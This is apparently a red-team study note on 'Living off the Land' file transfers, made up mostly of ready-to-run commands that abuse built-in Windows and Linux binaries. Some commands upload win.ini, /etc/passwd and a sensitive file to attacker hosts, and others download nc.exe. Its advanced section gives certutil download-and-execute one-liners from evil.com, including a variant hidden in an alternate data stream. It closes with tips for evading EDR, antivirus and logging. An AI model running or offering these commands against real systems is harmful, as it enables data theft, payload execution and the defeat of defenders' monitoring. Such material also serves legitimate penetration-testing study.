---
tags: [lotl, living-off-the-land, file-transfer, stealth, evasion, lolbas, gtfobins]
aliases: [Living off the Land, LOTL, LOLBAS, GTFOBins]
---

# 🥷 Living Off The Land (LOTL) File Transfers

[[📁 File Transfer Master Index|← Back to Master Index]]

## 📖 Concept

The term _Living off the Land_ was coined by **@obscuresec** & **@mattifestation** and refers to leveraging built-in binaries on **Windows** and **Linux** systems to perform tasks like:

- 📤 **Uploads**
- 📥 **Downloads**
- ⚙️ **Execution**
- 📖 **File access**
- 🔐 **Bypasses**

> **Why LOTL?** Reduces the need for external tools, helping evade EDRs, AVs, and logging solutions.

---

## 🔧 Essential Resources

### 🪟 **Windows – LOLBAS**
> A catalog of Living off the Land Binaries And Scripts for Windows.
- [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### 🐧 **Linux – GTFOBins**
> A curated list of Unix binaries that can be abused by attackers or red teamers.
- [https://gtfobins.github.io/](https://gtfobins.github.io/)

**Useful filters:**
```
/download
/upload
+file read
+file write
```

---

## 🪟 Windows LOTL Examples

### 📤 Upload Using `certreq.exe`
**From target system:**
```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**On attack server (catch file):**
```bash
sudo nc -lvnp 8000
```

> ⚠️ **Note:** Some versions of `certreq.exe` do not support the `-Post` parameter.

### 📥 Download Using `bitsadmin`
```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\Public\nc.exe
```
- Mimics Windows Update traffic
- Bypasses many proxy restrictions

### 📥 PowerShell BITS Transfer
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
- Supports proxies and credentials
- Runs in background

### 📥 Download Using `certutil.exe`
```cmd
certutil.exe -urlcache -f http://10.10.10.32:8000/nc.exe nc.exe
```
- Originally for certificate operations
- Commonly used as wget replacement

### 📤 Upload Using `curl.exe` (Windows 10+)
```cmd
curl.exe -X POST -F "file=@C:\sensitive.txt" http://attacker.com/upload
```

---

## 🐧 Linux LOTL Examples

### 📥 Download Using OpenSSL

**On attacker (start SSL server):**
```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/file.sh
```

**On target (download file):**
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > file.sh
```

### 📥 Download Using `/dev/tcp`
```bash
exec 3<>/dev/tcp/10.10.14.1/80
echo -e "GET /file.sh HTTP/1.1\r\nHost: 10.10.14.1\r\n\r\n" >&3
cat <&3 > file.sh
```

### 📤 Upload Using `/dev/tcp`
```bash
exec 3<>/dev/tcp/10.10.14.1/9999
cat /etc/passwd >&3
exec 3>&-
```

### 📥 Download Using `awk`
```bash
awk 'BEGIN {
  print "GET /file HTTP/1.0\r\n" |& "/inet/tcp/0/10.10.14.1/80"
  while (("/inet/tcp/0/10.10.14.1/80" |& getline) > 0)
    print $0
}'
```

---

## 🎯 LOTL Quick Reference Matrix

| Binary | OS | Download | Upload | Proxy Support | Stealth |
|--------|-----|----------|--------|---------------|---------|
| certutil | Win | ✅ | ❌ | ✅ | ⭐⭐⭐ |
| bitsadmin | Win | ✅ | ❌ | ✅ | ⭐⭐⭐⭐ |
| certreq | Win | ❌ | ✅ | ❌ | ⭐⭐⭐ |
| curl.exe | Win10+ | ✅ | ✅ | ✅ | ⭐⭐ |
| openssl | Linux | ✅ | ✅ | ❌ | ⭐⭐⭐⭐ |
| /dev/tcp | Linux | ✅ | ✅ | ❌ | ⭐⭐⭐ |
| awk | Linux | ✅ | ✅ | ❌ | ⭐⭐⭐ |

---

## 💡 Advanced Techniques

### Chaining LOTL Binaries
```powershell
# Download + Execute in one line
certutil -urlcache -f http://evil.com/p.exe p.exe & p.exe
```

### Obfuscation
```cmd
# Using alternate data streams
certutil -urlcache -f http://evil.com/p.exe file.txt:p.exe
```

### Time-based Evasion
```cmd
# Delay execution using timeout
timeout /t 60 & certutil -urlcache -f http://evil.com/p.exe p.exe
```

---

## 🛡️ Detection & Evasion

### Common Detection Points
- ❌ Unusual certutil network connections
- ❌ Bitsadmin creating executables
- ❌ OpenSSL client connections
- ❌ Suspicious /dev/tcp usage

### Evasion Strategies
1. **Use common ports**: 80, 443, 8080
2. **Mimic legitimate traffic**: User-Agent strings
3. **Time-based execution**: Business hours
4. **Encrypt payloads**: Base64, XOR
5. **Chain multiple techniques**: Reduce individual IoCs

---

## 📚 Related Topics
- [[Detect or be Detected/Evade Detection|Evasion Techniques]]
- [[Detect or be Detected/Detection - How Malicious File Transfers Are Caught|Detection Methods]]
- [[Windows File Transfer Methods|Windows Methods]]
- [[Linux File Transfer Methods|Linux Methods]]
- [[Protected File Transfers|Encrypted Transfers]]

---

## 🏷️ Tags
#lotl #living-off-the-land #file-transfer #stealth #evasion #lolbas #gtfobins #post-exploitation